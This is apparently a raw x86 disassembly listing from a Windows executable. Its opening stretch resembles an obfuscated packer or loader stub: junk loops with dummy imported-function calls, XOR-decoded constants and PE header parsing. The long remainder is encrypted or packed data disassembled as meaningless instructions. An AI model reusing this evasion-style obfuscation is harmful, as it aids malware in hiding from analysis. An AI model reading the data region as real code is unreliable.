  4028aa:	push   DWORD PTR [ebp-0x24]
  4028ad:	push   0x43f7
  4028b2:	push   0x38dd
  4028b7:	push   DWORD PTR [ebp-0x10]
  4028ba:	push   0x3246
  4028bf:	push   0x510b
  4028c4:	push   0x8cd7
  4028c9:	push   DWORD PTR [ebp-0xc]
  4028cc:	push   0x63f7
  4028d1:	push   DWORD PTR [ebp-0x10]
  4028d4:	call   DWORD PTR ds:0x42e8bb
  4028da:	cmp    DWORD PTR ds:0x42d000,0x6
  4028e1:	jne    0x4028f4
  4028e7:	mov    ecx,DWORD PTR ds:0x42d000
  4028ed:	dec    ecx
  4028ee:	mov    DWORD PTR ds:0x42d000,ecx
  4028f4:	mov    ecx,DWORD PTR ds:0x42d000
  4028fa:	dec    ecx
  4028fb:	mov    DWORD PTR ds:0x42d000,ecx
  402901:	jmp    0x402880
  402906:	mov    ecx,0x751089b
  40290b:	xor    eax,ecx
  40290d:	cmp    eax,0xf89c85f0
  402912:	jne    0x402941
  402918:	mov    eax,DWORD PTR [ebp+0x8]
  40291b:	push   esi
  40291c:	mov    esi,DWORD PTR [ebp+0x8]
  40291f:	add    esi,DWORD PTR [eax+0x3c]
  402922:	mov    DWORD PTR [ebp+0x8],esi
  402925:	mov    eax,DWORD PTR [ebp-0x4]
  402928:	mov    esi,DWORD PTR [ebp+0x8]
  40292b:	xor    eax,ecx
  40292d:	add    eax,edx
  40292f:	cmp    DWORD PTR [esi+0x54],eax
  402932:	pop    esi
  402933:	je     0x402941
  402939:	mov    eax,DWORD PTR [ebp+0x8]
  40293c:	jmp    0x402948
  402941:	mov    eax,DWORD PTR [ebp-0x4]
  402944:	xor    eax,ecx
  402946:	add    eax,edx
  402948:	leave  
  402949:	ret    0x4
  40294c:	push   ebp
  40294d:	mov    ebp,esp
  40294f:	sub    esp,0x38
  402952:	xor    eax,eax
  402954:	xor    eax,DWORD PTR ds:0x42c00c
  40295a:	xor    DWORD PTR ds:0x42d010,eax
  402960:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  402967:	and    DWORD PTR ds:0x429020,0x0
  402971:	jmp    0x402981
  402976:	mov    eax,ds:0x429020
  40297b:	inc    eax
  40297c:	mov    ds:0x429020,eax
  402981:	cmp    DWORD PTR ds:0x429020,0x12
  402988:	jae    0x4029d7
  40298e:	cmp    DWORD PTR ds:0x429020,0x4
  402995:	jne    0x4029b5
  40299b:	push   0x3575
  4029a0:	push   0x2056
  4029a5:	push   0x7cad
  4029aa:	push   0x3741
  4029af:	call   DWORD PTR ds:0x42e8e7
  4029b5:	cmp    DWORD PTR ds:0x429020,0x3
  4029bc:	jne    0x4029d0
  4029c2:	xor    eax,eax
  4029c4:	add    eax,DWORD PTR ds:0x429020
  4029ca:	inc    eax
  4029cb:	mov    ds:0x429020,eax
  4029d0:	jmp    0x402976
  4029d5:	not    eax
  4029d7:	push   ebx
  4029d8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4029df:	mov    eax,DWORD PTR [ebp-0x4]
  4029e2:	add    DWORD PTR ds:0x42900c,0x42a018
  4029ec:	push   esi
  4029ed:	mov    esi,0x751089b
  4029f2:	xor    DWORD PTR ds:0x429018,0x429014
  4029fc:	xor    eax,esi
  4029fe:	sbb    DWORD PTR ds:0x42b000,0x77b
  402a08:	push   edi
  402a09:	mov    DWORD PTR ds:0x429018,0x1e
  402a13:	cmp    DWORD PTR ds:0x429018,0x0
  402a1a:	je     0x402a6e
  402a20:	cmp    DWORD PTR ds:0x429018,0xe
  402a27:	jne    0x402a42
  402a2d:	push   0x6dbc
  402a32:	push   0x42a004
  402a37:	push   0x657a
  402a3c:	call   DWORD PTR ds:0x42e8bf
  402a42:	cmp    DWORD PTR ds:0x429018,0xf
  402a49:	jne    0x402a5c
  402a4f:	mov    edi,DWORD PTR ds:0x429018
  402a55:	dec    edi
  402a56:	mov    DWORD PTR ds:0x429018,edi
  402a5c:	mov    edi,DWORD PTR ds:0x429018
  402a62:	dec    edi
  402a63:	mov    DWORD PTR ds:0x429018,edi
  402a69:	jmp    0x402a13
  402a6e:	mov    edi,0x3272e2
  402a73:	or     DWORD PTR ds:0x42a014,0x429014
  402a7d:	add    eax,edi
  402a7f:	adc    DWORD PTR ds:0x429008,0x42a018
  402a89:	mov    DWORD PTR [ebp-0x1c],eax
  402a8c:	movzx  eax,BYTE PTR ds:0x429010
  402a93:	xor    eax,DWORD PTR ds:0x42b00c
  402a99:	mov    ds:0x429010,eax
  402a9e:	mov    eax,DWORD PTR [ebp+0x14]
  402aa1:	test   eax,eax
  402aa3:	jmp    0x404df8
  402aa8:	retf   
  402aa9:	int    0x38
  402aab:	outs   dx,DWORD PTR ds:[esi]
  402aac:	cmp    cl,BYTE PTR [ebx-0x3abb3675]
  402ab2:	jae    0x402a43
  402ab4:	mov    eax,0x7c3bb983
  402ab9:	jl     0x402b37
  402abb:	jl     0x402af1
  402abd:	pop    edi
  402abe:	jl     0x402b3c
  402ac0:	adc    eax,0x1139172e
  402ac5:	and    eax,0x32652f13
  402aca:	popa   
  402acb:	pusha  
  402acc:	xor    ah,BYTE PTR [esp+ebp*2+0x6c]
  402ad0:	ins    DWORD PTR es:[edi],dx
  402ad1:	xor    al,0xc5
  402ad3:	fdivp  st(1),st
  402ad5:	push   0x42
  402ad7:	arpl   WORD PTR [ecx+0x53],di
  402ada:	stos   BYTE PTR es:[edi],al
  402adb:	jp     0x402b4a
  402add:	push   ecx
  402ade:	iret   
  402adf:	pop    ebp
  402ae0:	dec    esp
  402ae1:	cmp    cl,BYTE PTR [esi+0x577087fc]
  402ae7:	dec    ebp
  402ae8:	jg     0x402b21
  402aea:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402af0:	jmp    DWORD PTR cs:[eax-0x22]
  402af4:	cld    
  402af5:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402af9:	xor    ebp,ecx
  402afb:	mov    esp,0xd82b87ed
  402b00:	and    DWORD PTR [ecx],0xf
  402b03:	push   ecx
  402b04:	mov    ds:0x6df7c68c,eax
  402b09:	fld    QWORD PTR [esi]
  402b0b:	(bad)  
  402b0c:	or     ah,bh
  402b0e:	and    BYTE PTR [edx],dl
  402b10:	inc    edx
  402b11:	push   cs
  402b12:	and    BYTE PTR [ebx+0x62],ah
  402b15:	mov    cl,0xaf
  402b17:	sub    ebx,DWORD PTR [ecx+0x5]
  402b1a:	mov    al,ds:0x2341e1ff
  402b1f:	jbe    0x402b55
  402b21:	ret    0xf153
  402b24:	sbb    al,0xfc
  402b26:	jb     0x402ae1
  402b28:	jnp    0x402b07
  402b2a:	xchg   edx,eax
  402b2b:	pop    edi
  402b2c:	cmp    DWORD PTR [ecx+0x49841607],0xb
  402b33:	cwde   
  402b34:	ds je  0x402ac2
  402b37:	add    ebx,esp
  402b39:	sub    eax,0x4b368d54
  402b3e:	push   esi
  402b3f:	sti    
  402b40:	iret   
  402b41:	mov    WORD PTR [ecx],fs
  402b43:	or     edx,0x6982ceb7
  402b49:	out    0x45,al
  402b4b:	push   esp
  402b4c:	dec    esi
  402b4d:	push   cs
  402b4e:	cmp    BYTE PTR [ebx],cl
  402b50:	xor    BYTE PTR [ebx],bl
  402b52:	lods   eax,DWORD PTR ds:[esi]
  402b53:	inc    ebx
  402b54:	int3   
  402b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b56:	dec    edx
  402b57:	fiadd  DWORD PTR [esi]
  402b59:	push   eax
  402b5a:	std    
  402b5b:	push   esp
  402b5c:	push   eax
  402b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b5e:	icebp  
  402b5f:	bound  edi,QWORD PTR [edi+0x591f44f2]
  402b65:	xlat   BYTE PTR ds:[ebx]
  402b66:	sbb    DWORD PTR [edx],edi
  402b68:	lods   al,BYTE PTR ds:[esi]
  402b69:	test   al,dh
  402b6b:	mov    ch,0xec
  402b6d:	dec    edx
  402b6e:	jne    0x402ba8
  402b70:	ss cdq 
  402b72:	(bad)  
  402b73:	rcr    BYTE PTR [edx],1
  402b75:	add    DWORD PTR [ecx-0x1f],ecx
  402b78:	outs   dx,DWORD PTR ds:[esi]
  402b79:	and    ebp,DWORD PTR [eax]
  402b7b:	pop    esp
  402b7c:	cmp    BYTE PTR [esi-0x5f],0xbf
  402b80:	lahf   
  402b81:	lea    edx,[ecx+esi*1-0x43]
  402b85:	dec    edi
  402b86:	push   eax
  402b87:	push   edi
  402b88:	adc    esp,DWORD PTR [esi+0x17f941ee]
  402b8e:	scas   al,BYTE PTR es:[edi]
  402b8f:	xchg   ebp,eax
  402b90:	and    edx,ebx
  402b92:	and    BYTE PTR [eax],dh
  402b94:	mov    esp,0x78f51ea2
  402b99:	mov    esp,0x58f5683a
  402b9e:	mov    ecx,DWORD PTR [edx+0x27]
  402ba1:	popf   
  402ba2:	clc    
  402ba3:	push   ebx
  402ba4:	or     DWORD PTR [ebp+0x20714ee6],eax
  402baa:	outs   dx,BYTE PTR ds:[esi]
  402bab:	jbe    0x402b8a
  402bad:	stos   BYTE PTR es:[edi],al
  402bae:	xchg   edi,eax
  402baf:	leave  
  402bb0:	das    
  402bb1:	adc    al,0x70
  402bb3:	es das 
  402bb5:	pop    ss
  402bb6:	jle    0x402b3c
  402bb8:	lods   eax,DWORD PTR ds:[esi]
  402bb9:	dec    esp
  402bba:	or     BYTE PTR [ecx+0x35],al
  402bbd:	xor    ebx,DWORD PTR [ecx-0x53a54835]
  402bc3:	mov    eax,ds:0xe3bb3c18
  402bc8:	sub    al,0x7e
  402bca:	jno    0x402b78
  402bcc:	jno    0x402b62
  402bce:	mov    bl,0x80
  402bd0:	jbe    0x402baa
  402bd2:	mov    edx,0x13548661
  402bd7:	cdq    
  402bd8:	test   BYTE PTR [ecx-0x681557a8],bh
  402bde:	enter  0x79bb,0x37
  402be2:	int    0x12
  402be4:	ins    BYTE PTR es:[edi],dx
  402be5:	adc    DWORD PTR [edx+ecx*8],esp
  402be8:	icebp  
  402be9:	push   esp
  402bea:	cwde   
  402beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bec:	movups xmm5,XMMWORD PTR [edi]
  402bef:	mov    dh,0xf3
  402bf1:	cmp    eax,0x950dcae
  402bf6:	push   es
  402bf7:	sbb    edi,edi
  402bf9:	jp     0x402b90
  402bfb:	or     ecx,DWORD PTR [esi+0x21b984fd]
  402c01:	bound  ecx,QWORD PTR [edi+0x4e]
  402c04:	pusha  
  402c05:	add    bh,bh
  402c07:	sbb    al,0x8
  402c09:	popa   
  402c0a:	(bad)  
  402c0b:	fisttp WORD PTR [ebx+0x14e2868a]
  402c11:	mov    bh,BYTE PTR [esi]
  402c13:	pop    ds
  402c14:	(bad)  
  402c15:	jbe    0x402c56
  402c17:	jns    0x402bb5
  402c19:	mov    ds:0x599229d7,eax
  402c1e:	inc    ebp
  402c1f:	inc    ebx
  402c20:	loope  0x402bae
  402c22:	or     ah,al
  402c24:	(bad)  [ebp-0x3c]
  402c27:	out    dx,al
  402c28:	(bad)  
  402c29:	loopne 0x402be2
  402c2b:	sbb    al,0x75
  402c2d:	jl     0x402c5c
  402c2f:	xlat   BYTE PTR ds:[ebx]
  402c30:	sti    
  402c31:	sub    eax,0x912bd8fb
  402c36:	cdq    
  402c37:	mov    esp,0xd6029813
  402c3c:	fisttp QWORD PTR [ecx+0x35]
  402c3f:	push   ds
  402c40:	in     al,dx
  402c41:	mov    bl,0x1a
  402c43:	jecxz  0x402c4d
  402c45:	push   esp
  402c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c47:	jl     0x402c72
  402c49:	push   ebp
  402c4a:	xor    dh,BYTE PTR [edx]
  402c4c:	xor    eax,0x665bd8eb
  402c51:	push   edx
  402c52:	popa   
  402c53:	adc    cl,ah
  402c55:	mov    ch,0xf0
  402c57:	xlat   BYTE PTR ds:[ebx]
  402c58:	mov    dl,0x2b
  402c5a:	mov    al,0x6a
  402c5c:	dec    esp
  402c5d:	or     bl,0x2
  402c60:	mov    WORD PTR gs:[edi-0x5f9f5270],ds
  402c67:	add    BYTE PTR [esi-0x58],dh
  402c6a:	sbb    BYTE PTR [ebp-0x58ccc1fe],0x42
  402c71:	inc    ebx
  402c72:	retf   0xada2
  402c75:	inc    esi
  402c76:	nop
  402c77:	jbe    0x402c24
  402c79:	sbb    edi,DWORD PTR [edx]
  402c7b:	pushf  
  402c7c:	push   cs
  402c7d:	xlat   BYTE PTR ds:[ebx]
  402c7e:	cmp    DWORD PTR [esi],ecx
  402c80:	cwde   
  402c81:	mov    eax,ds:0xeeda2918
  402c86:	mov    dh,0x25
  402c88:	ret    
  402c89:	ficomp WORD PTR [edi]
  402c8b:	cmp    al,0x4b
  402c8d:	cmp    BYTE PTR [edx-0x33a1aa91],bh
  402c93:	xchg   edi,eax
  402c94:	faddp  st(5),st
  402c96:	mov    al,0x54
  402c98:	outs   dx,BYTE PTR ds:[esi]
  402c99:	cld    
  402c9a:	(bad)  
  402c9c:	cdq    
  402c9d:	fcmove st,st(6)
  402c9f:	leave  
  402ca0:	pop    ecx
  402ca1:	xor    al,0x4a
  402ca3:	lods   eax,DWORD PTR ds:[esi]
  402ca4:	adc    al,0xd8
  402ca6:	outs   dx,DWORD PTR ds:[esi]
  402ca7:	pop    esp
  402ca8:	dec    esp
  402ca9:	stos   DWORD PTR es:[edi],eax
  402caa:	add    ecx,DWORD PTR [edi+0x5f]
  402cad:	adc    DWORD PTR [esi],0xffffffd9
  402cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cb1:	adc    esp,DWORD PTR [ebp+0x670e43ba]
  402cb7:	pop    ebp
  402cb8:	inc    ecx
  402cb9:	iret   
  402cba:	push   0x36c70af6
  402cbf:	fnstenv [edi]
  402cc1:	fcom   st(5)
  402cc3:	and    bp,WORD PTR [eax-0xe]
  402cc7:	repnz or edi,DWORD PTR [edx+0x916e2d9]
  402cce:	pop    ebp
  402ccf:	popa   
  402cd0:	or     al,0xca
  402cd2:	stc    
  402cd3:	inc    edx
  402cd4:	push   es
  402cd5:	in     eax,dx
  402cd6:	jb     0x402d02
  402cd8:	(bad)  
  402cd9:	daa    
  402cda:	pop    edi
  402cdb:	jle    0x402caa
  402cdd:	or     BYTE PTR [edi],dh
  402cdf:	mov    al,0xad
  402ce1:	pop    ss
  402ce2:	sub    ch,BYTE PTR [edi-0x1a4e5826]
  402ce8:	mov    bl,0x93
  402cea:	mov    DWORD PTR [ecx-0x64ee3a5a],0x2ded00c6
  402cf4:	pushf  
  402cf5:	push   esp
  402cf6:	imul   edi,DWORD PTR [edx+ebx*4+0x2fe71e84],0x5779642f
  402d01:	add    ebp,edi
  402d03:	out    0xd,eax
  402d05:	hlt    
  402d06:	jge    0x402d5a
  402d08:	scas   eax,DWORD PTR es:[edi]
  402d09:	(bad)  
  402d0b:	jnp    0x402c9d
  402d0d:	mov    ah,bl
  402d0f:	sbb    esi,DWORD PTR ds:0xb052c74d
  402d15:	imul   DWORD PTR [eax+eax*1]
  402d18:	or     dh,BYTE PTR ds:0x708a122e
  402d1e:	xor    bl,ah
  402d20:	js     0x402d71
  402d22:	fbld   TBYTE PTR [esi+0x5e]
  402d25:	das    
  402d26:	add    DWORD PTR [ebx+0x4c34e7be],ecx
  402d2c:	or     DWORD PTR [esi-0xb],edx
  402d2f:	add    DWORD PTR [edi*4-0x32d892c1],eax
  402d36:	mov    ebp,0xa6e8974d
  402d3b:	adc    al,0x7a
  402d3d:	test   al,0xb7
  402d3f:	pushf  
  402d40:	lods   al,BYTE PTR ds:[esi]
  402d41:	in     eax,0xf2
  402d43:	add    eax,0x92353e03
  402d48:	xchg   edi,eax
  402d49:	in     al,dx
  402d4a:	lds    ebp,FWORD PTR [ecx-0x7033c6fe]
  402d50:	js     0x402db9
  402d52:	or     esi,DWORD PTR [ecx-0x25b2d916]
  402d58:	js     0x402db5
  402d5a:	and    dl,dh
  402d5c:	scas   al,BYTE PTR es:[edi]
  402d5d:	bound  esi,QWORD PTR [ebx+eiz*8-0x7d0fdbb5]
  402d64:	inc    eax
  402d65:	push   ds
  402d66:	mov    edi,0x1fcba63f
  402d6b:	pop    ebp
  402d6c:	inc    esi
  402d6e:	(bad)  
  402d70:	xchg   DWORD PTR [ebp-0x79],eax
  402d73:	jnp    0x402ddd
  402d75:	ds (bad) 
  402d77:	mov    dh,0x80
  402d79:	ret    
  402d7a:	test   BYTE PTR [ebp-0x756e310f],cl
  402d80:	jmp    0xefd47c96
  402d85:	jnp    0x402d75
  402d87:	sahf   
  402d88:	in     eax,dx
  402d89:	inc    eax
  402d8a:	mov    dh,0x89
  402d8c:	mov    esi,0x59f17656
  402d91:	rcl    DWORD PTR [edi],cl
  402d93:	stos   DWORD PTR es:[edi],eax
  402d94:	in     eax,0x3
  402d96:	retf   0x14e1
  402d99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d9a:	push   cs
  402d9b:	adc    al,BYTE PTR [eax-0x6d2f4b25]
  402da1:	mov    dh,0x2c
  402da3:	adc    ecx,esi
  402da5:	shl    BYTE PTR [ebx-0x63],0x6
  402da9:	sti    
  402daa:	jo     0x402df5
  402dac:	les    esp,FWORD PTR [esi-0x62]
  402daf:	call   0x8add4c0c
  402db4:	mov    esi,0xa1d24223
  402db9:	sub    BYTE PTR [edi+ebp*2+0x6a9fe9b4],ah
  402dc0:	(bad)  
  402dc1:	cld    
  402dc2:	push   ds
  402dc3:	aam    0x75
  402dc5:	push   0x23
  402dc7:	or     al,0x0
  402dc9:	adc    BYTE PTR ds:0xe51eeb1d,cl
  402dcf:	xchg   ebp,eax
  402dd0:	mov    al,0x1d
  402dd2:	js     0x402e52
  402dd4:	xchg   edx,eax
  402dd5:	stos   DWORD PTR es:[edi],eax
  402dd6:	aam    0x24
  402dd8:	mov    eax,ds:0xdac2f438
  402ddd:	hlt    
  402dde:	or     BYTE PTR [edi-0x3d],ah
  402de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402de2:	inc    edi
  402de3:	leave  
  402de4:	inc    esi
  402de5:	mov    esi,0x7ef7e9fc
  402dea:	sar    BYTE PTR [esi],0x9
  402ded:	fptan  
  402def:	pop    ds
  402df0:	mov    eax,0xf8abcbe3
  402df5:	mov    ds:0x4c21d539,eax
  402dfa:	cmp    eax,0xedc15c88
  402dff:	push   ss
  402e00:	lds    esi,FWORD PTR [ecx]
  402e02:	cmp    BYTE PTR [eax],dl
  402e04:	gs jl  0x402dbe
  402e07:	adc    DWORD PTR [ebx+edx*8+0x706d59f0],ebp
  402e0e:	cmp    DWORD PTR [eax+0x69],esi
  402e11:	sahf   
  402e12:	(bad)  
  402e13:	jmp    FWORD PTR [edx+0x4b655496]
  402e19:	gs (bad) 
  402e1c:	jg     0x402e26
  402e1e:	aam    0x8
  402e20:	and    al,0xba
  402e22:	sub    al,0x69
  402e24:	fimul  WORD PTR [ebx-0x2198860d]
  402e2a:	stos   DWORD PTR es:[edi],eax
  402e2b:	xchg   ecx,eax
  402e2c:	mov    ds:0x9a2acc22,al
  402e31:	imul   eax,DWORD PTR [edi-0x66],0x92896275
  402e38:	jns    0x402df2
  402e3a:	mov    al,0xd5
  402e3c:	jecxz  0x402e90
  402e3e:	dec    ebp
  402e3f:	cdq    
  402e40:	mov    ah,0xe
  402e42:	ret    
  402e43:	cmp    BYTE PTR [edi-0x2430aedd],dh
  402e49:	(bad)  
  402e4a:	pop    ebx
  402e4b:	xchg   ebp,eax
  402e4c:	pusha  
  402e4d:	int3   
  402e4e:	sbb    bh,cl
  402e50:	aam    0x86
  402e52:	lea    ebp,[esi]
  402e54:	(bad)  
  402e55:	xchg   ecx,eax
  402e56:	inc    edi
  402e57:	mov    esi,DWORD PTR [esi]
  402e59:	jne    0x402e95
  402e5b:	sub    al,BYTE PTR [esi+0x3c8c0a74]
  402e61:	inc    DWORD PTR [ebp-0x2534f222]
  402e67:	mov    ds:0xd717b7d3,al
  402e6c:	loope  0x402eaa
  402e6e:	stos   DWORD PTR es:[edi],eax
  402e6f:	mov    eax,0xf5ac8866
  402e74:	pop    ecx
  402e75:	test   BYTE PTR gs:[ebp-0x23],bl
  402e79:	pop    es
  402e7a:	enter  0x18cc,0x71
  402e7e:	xor    BYTE PTR [ecx],0xc3
  402e81:	sbb    BYTE PTR ss:[ecx+0x22788f4f],bl
  402e88:	repz out 0x19,al
  402e8b:	ss ret 0xa2a9
  402e8f:	mov    dl,0x6f
  402e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e92:	shr    DWORD PTR ds:0x2c355257,cl
  402e98:	test   eax,ebx
  402e9a:	and    DWORD PTR [ecx],0xa8364ee5
  402ea0:	mov    al,0xc7
  402ea2:	jmp    0xd9b6df93
  402ea7:	cdq    
  402ea8:	mov    esp,0x153d162a
  402ead:	push   esp
  402eae:	xchg   edx,eax
  402eaf:	loopne 0x402e41
  402eb1:	(bad)  
  402eb2:	sahf   
  402eb3:	imul   edi,DWORD PTR [eax],0xffffffd4
  402eb6:	jb     0x402e54
  402eb8:	push   cs
  402eb9:	inc    ebp
  402eba:	pop    eax
  402ebb:	aaa    
  402ebc:	ins    DWORD PTR es:[edi],dx
  402ebd:	xchg   DWORD PTR [eax-0x1809a39f],eax
  402ec3:	push   ss
  402ec4:	imul   eax,DWORD PTR [esi+0x69],0x23f79ffd
  402ecb:	fnstsw WORD PTR [ebp-0x21]
  402ece:	in     al,dx
  402ecf:	dec    eax
  402ed0:	push   esi
  402ed1:	add    BYTE PTR [esi],cl
  402ed3:	dec    edx
  402ed4:	mov    eax,ds:0x2098c0e5
  402ed9:	mov    ebp,0x1dcc2a0f
  402ede:	cmp    ch,BYTE PTR [ebx+0x3e]
  402ee1:	mov    ecx,0xd19b9baa
  402ee6:	adc    eax,0x6cbc8434
  402eeb:	dec    esi
  402eec:	icebp  
  402eed:	mov    dh,0xfd
  402eef:	repz cmp al,0x36
  402ef2:	jno    0x402f19
  402ef4:	and    eax,0xd70628d
  402ef9:	mov    dh,dl
  402efb:	adc    ecx,DWORD PTR [ebp-0x5892cb8]
  402f01:	adc    DWORD PTR [ebx],esi
  402f03:	sub    dh,BYTE PTR ds:0xfa676b2f
  402f09:	(bad)  
  402f0a:	std    
  402f0b:	mov    gs,WORD PTR [ebx-0x48]
  402f0e:	push   ebx
  402f0f:	xor    ebp,eax
  402f11:	adc    BYTE PTR [ecx+0x0],dh
  402f14:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  402f16:	mov    fs,WORD PTR [edi-0x7af6226c]
  402f1c:	ins    BYTE PTR es:[edi],dx
  402f1d:	fisttp DWORD PTR [edx-0x11]
  402f20:	sbb    BYTE PTR [ecx],ch
  402f22:	inc    esi
  402f23:	rep ins DWORD PTR es:[edi],dx
  402f25:	adc    bh,cl
  402f27:	iret   
  402f28:	int    0xfb
  402f2a:	cld    
  402f2b:	loope  0x402f0c
  402f2d:	loop   0x402f98
  402f2f:	retf   0x6136
  402f32:	dec    edx
  402f33:	shr    edi,1
  402f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f36:	cmp    DWORD PTR [ebx],ebp
  402f38:	mov    ecx,0xe9086ce2
  402f3d:	xor    BYTE PTR [esi+eiz*2+0x5f44ede9],bl
  402f44:	add    al,0x37
  402f46:	scas   eax,DWORD PTR es:[edi]
  402f47:	cmp    al,0x21
  402f49:	lds    esp,FWORD PTR [ecx+0x41]
  402f4c:	inc    esi
  402f4d:	fcomp  QWORD PTR [edx]
  402f4f:	mov    ecx,0x782828dc
  402f54:	mov    edx,0xc63e47a6
  402f59:	mov    esi,0x203c7d15
  402f5e:	iret   
  402f5f:	mov    edx,0x8114735e
  402f64:	xor    ebp,esp
  402f66:	mov    BYTE PTR [ecx],dl
  402f68:	outs   dx,DWORD PTR ds:[esi]
  402f69:	aaa    
  402f6a:	imul   esi,DWORD PTR [ebp-0x53],0x5c
  402f6e:	retf   0xe6ba
  402f71:	fwait
  402f72:	imul   esp,DWORD PTR [ebp+0x3a2206ed],0x52b8c627
  402f7c:	sar    DWORD PTR [ebp-0x1f92659f],1
  402f82:	cmp    edi,DWORD PTR [ecx+0x3151b13e]
  402f88:	jo     0x402fb8
  402f8a:	rcr    DWORD PTR [edx-0x7cafb619],0xb2
  402f91:	xor    cl,dl
  402f93:	cmp    edx,DWORD PTR [edi+0x40e3799d]
  402f99:	mov    eax,edx
  402f9b:	imul   ebx,ebx,0xffffff99
  402f9e:	test   dl,al
  402fa0:	clc    
  402fa1:	mov    ebp,0x59bf85d9
  402fa6:	es stc 
  402fa8:	shl    BYTE PTR [eax+0x5b],1
  402fab:	es dec esp
  402fad:	mov    es:0xeaf5856a,al
  402fb3:	sahf   
  402fb4:	sti    
  402fb5:	dec    ecx
  402fb6:	jl     0x402ff7
  402fb8:	xor    eax,0x1d0690e2
  402fbd:	bound  esi,QWORD PTR [esi-0x5835b46e]
  402fc3:	and    eax,0xff736b67
  402fc8:	mov    dh,0xbe
  402fca:	call   0x7528:0x3cdf56cf
  402fd1:	mov    edi,0x170157
  402fd6:	adc    BYTE PTR [edx+ebp*8],cl
  402fd9:	fild   DWORD PTR [edx+0x47b3e4b5]
  402fdf:	das    
  402fe0:	inc    ebp
  402fe1:	dec    edx
  402fe2:	std    
  402fe3:	mov    cl,0xf9
  402fe5:	fwait
  402fe6:	push   esi
  402fe7:	aaa    
  402fe8:	mov    dl,0x27
  402fea:	cmp    DWORD PTR [ecx-0x6c],ebx
  402fed:	push   eax
  402fee:	sbb    edx,DWORD PTR [esi+0x67]
  402ff1:	js     0x40305f
  402ff3:	jle    0x402faf
  402ff5:	push   ebp
  402ff6:	mov    al,ds:0xbfcbec5c
  402ffb:	cmp    eax,0xe8e8fa35
  403000:	retf   0xc060
  403003:	repz add al,0xfa
  403006:	mov    al,0x5f
  403008:	xor    eax,0xd3244800
  40300d:	mov    edi,0x383b84b7
  403012:	jae    0x40306b
  403014:	imul   eax,DWORD PTR [ecx+ecx*4+0x40b37d65],0xffffffef
  40301c:	ins    DWORD PTR es:[edi],dx
  40301d:	xor    eax,0x5b77c2ab
  403022:	add    eax,0x8a900577
  403027:	aaa    
  403028:	and    BYTE PTR [ebp-0x6d828d90],bh
  40302e:	jg     0x402fc1
  403030:	sub    esp,DWORD PTR [edi-0x9]
  403033:	jmp    0x403034
  403035:	repz jno 0x40303f
  403038:	arpl   WORD PTR [edx+0x61beb19d],dx
  40303e:	xchg   edi,eax
  40303f:	and    BYTE PTR [eax-0x51],al
  403042:	cs aad 0x86
  403045:	mov    ebx,0x68ab6dee
  40304a:	mov    BYTE PTR [ebp-0x524c3521],ah
  403050:	cdq    
  403051:	call   0x21610777
  403056:	xchg   dh,bl
  403058:	aam    0xfc
  40305a:	xchg   DWORD PTR [ebx],ebp
  40305c:	mov    DWORD PTR [ebp+0x6b],ecx
  40305f:	inc    ecx
  403060:	xlat   BYTE PTR ds:[ebx]
  403061:	mov    bh,0x5b
  403063:	out    dx,al
  403064:	mov    ds:0x586e3d23,eax
  403069:	push   ds
  40306a:	les    ebx,FWORD PTR [eax+edx*2-0x10]
  40306e:	(bad)  
  40306f:	pop    ss
  403070:	push   0x58863b8d
  403075:	into   
  403076:	pop    ebx
  403077:	add    BYTE PTR ds:0x921903f2,bh
  40307d:	leave  
  40307e:	out    dx,eax
  40307f:	nop
  403080:	dec    esi
  403081:	sar    ch,cl
  403083:	les    edi,FWORD PTR [ecx]
  403085:	adc    ebp,DWORD PTR [ecx-0x4c]
  403088:	fs xor esp,ecx
  40308b:	pushf  
  40308c:	out    0x84,al
  40308e:	ins    BYTE PTR es:[edi],dx
  40308f:	mov    bl,0xee
  403091:	xchg   DWORD PTR [ebp+0x631fce5a],esi
  403097:	int3   
  403098:	sub    esp,DWORD PTR [eax-0x2e]
  40309b:	test   al,0x5
  40309d:	stc    
  40309e:	ins    BYTE PTR es:[edi],dx
  40309f:	ins    DWORD PTR es:[edi],dx
  4030a0:	jo     0x4030cf
  4030a2:	cli    
  4030a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030a4:	push   esp
  4030a5:	loopne 0x4030e6
  4030a7:	and    BYTE PTR [eax-0xa],bh
  4030aa:	cmp    cl,BYTE PTR [eax+0x13e9ec5c]
  4030b0:	dec    esp
  4030b1:	dec    ebx
  4030b2:	and    edi,DWORD PTR [esp+ecx*8]
  4030b5:	mov    ds,WORD PTR [ebx-0x5b728e75]
  4030bb:	xor    al,0xd5
  4030bd:	jne    0x403049
  4030bf:	jg     0x403106
  4030c1:	jns    0x4030dc
  4030c3:	xlat   BYTE PTR ds:[ebx]
  4030c4:	jb     0x40307a
  4030c6:	hlt    
  4030c7:	imul   esp,DWORD PTR [ecx+0x7a],0x5abcc8c
  4030ce:	sub    BYTE PTR ds:0x3d30b3c5,0xc
  4030d5:	jecxz  0x403151
  4030d7:	popf   
  4030d8:	pop    esp
  4030d9:	jns    0x4030d4
  4030db:	push   esi
  4030dc:	scas   eax,DWORD PTR es:[edi]
  4030dd:	popa   
  4030de:	xchg   esi,eax
  4030df:	or     al,0x81
  4030e1:	ins    BYTE PTR es:[edi],dx
  4030e2:	and    bh,BYTE PTR [ebx+0x3a]
  4030e5:	retf   0xdb5f
  4030e8:	and    DWORD PTR [ebx+ebx*8+0x25],ebx
  4030ec:	adc    DWORD PTR [eax+0x4c783162],ebp
  4030f2:	sub    eax,0x708a71bd
  4030f7:	adc    BYTE PTR [eax],ah
  4030f9:	ss stos BYTE PTR es:[edi],al
  4030fb:	dec    ebp
  4030fc:	xor    ah,BYTE PTR [edi]
  4030fe:	loope  0x403156
  403100:	jb     0x4030e0
  403102:	fmul   st,st(6)
